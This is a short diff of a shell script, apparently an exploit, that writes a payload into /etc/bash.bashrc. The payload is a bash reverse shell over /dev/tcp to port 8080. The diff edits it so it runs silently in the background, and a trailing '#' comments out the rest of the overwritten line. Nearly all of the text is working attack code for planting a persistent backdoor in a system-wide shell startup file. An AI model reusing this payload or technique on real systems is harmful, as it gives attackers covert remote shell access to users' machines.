@@ -16,7 +16,7 @@
 target=/etc/bash.bashrc
 
 # note the trailing '#' to ignore any garbage from the old line
-payload="nohup bash -c 'bash -i>&/dev/tcp/localhost/8080 0>&1' &#"
+payload="(nohup bash -c 'bash -i>&/dev/tcp/localhost/8080 0>&1' >/dev/null 2>&1&) #"
 payload_len=$(printf "$payload" | wc -c)
 
 if [ ! -r $target ]; then
